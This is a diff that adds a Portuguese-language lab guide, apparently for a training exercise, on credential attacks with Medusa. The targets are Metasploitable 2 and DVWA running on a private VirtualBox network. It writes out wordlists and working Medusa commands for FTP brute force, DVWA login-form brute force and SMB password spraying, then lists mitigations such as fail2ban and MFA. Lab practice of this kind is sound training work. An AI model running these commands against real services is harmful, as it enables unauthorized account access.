@@ -1,0 +1,103 @@
+Preparação do Ambiente
+Crie duas VMs no VirtualBox:
+
+Kali Linux (atacante)
+
+Metasploitable 2 (alvo)
+
+Configure ambas na mesma rede interna (Host-Only).
+
+Exemplo de IPs: Kali: 192.168.56.101, Metasploitable: 192.168.56.102.​
+
+Instale a DVWA no Metasploitable, se necessário. O FTP e SMB já vêm vulneráveis.
+
+Certifique-se de que as VMs se conectam entre si (ping entre os hosts).
+
+Ataques Simulados com Medusa
+1. Ataque Força Bruta em FTP
+Crie wordlists simples:
+
+users.txt:
+
+text
+user
+admin
+msfadmin
+passwords.txt:
+
+text
+123456
+msfadmin
+password
+Comando Medusa exemplo:
+
+text
+medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp
+-h: IP do alvo
+
+-U: lista de usuários
+
+-P: lista de senhas
+
+-M: módulo/protocolo FTP.​
+
+2. Automação de força bruta em formulário web (DVWA)
+Identifique o campo de login de DVWA (usuário: admin).
+
+Exemplo de comando Medusa:
+
+text
+medusa -h 192.168.56.102 -u admin -P passwords.txt -M http -m FORM:/dvwa/login.php:username=admin&password=^PASS^:Login failed
+Ajuste os nomes dos campos conforme o formulário real.
+
+O parâmetro -m indica onde estão os campos de usuário/senha e a mensagem de erro para considerar tentativa falha.​
+
+3. Password Spraying com Enumeração SMB
+Primeiro, enumere usuários, por exemplo, usando o próprio Medusa ou ferramentas como enum4linux.
+
+Supondo que tenha a lista users.txt:
+
+text
+medusa -h 192.168.56.102 -U users.txt -p "msfadmin" -M smbnt
+Comando fará tentativas de login para todos os usuários da lista com a mesma senha (técnica de password spraying, menos “barulhenta” que brute force total).​
+
+Documentação dos Testes
+Exemplos de Wordlists
+text
+users.txt:
+admin
+msfadmin
+user
+
+passwords.txt:
+123456
+msfadmin
+password
+admin
+Comandos Utilizados
+FTP:
+medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp
+
+HTTP (DVWA):
+medusa -h 192.168.56.102 -u admin -P passwords.txt -M http -m FORM:/dvwa/login.php:username=admin&password=^PASS^:Login failed
+
+SMB (Spraying):
+medusa -h 192.168.56.102 -U users.txt -p msfadmin -M smbnt
+
+Validação de Acesso
+FTP: Tente autenticar após obter login válido com ftp 192.168.56.102.
+
+DVWA: Acesso à interface após descobrir a senha.
+
+SMB: Teste montagem de compartilhamento com login obtido.
+
+Recomendações de Mitigação
+Implemente bloqueio progressivo após tentativas falhas (exp: fail2ban).
+
+Exija senhas fortes (mínimo de complexidade).
+
+Limite tentativas de login em serviços.
+
+Utilize autenticação multifator (MFA) quando possível.
+
+Monitore logs para detectar tentativas anômalas e responder incidentes rapidamente.​
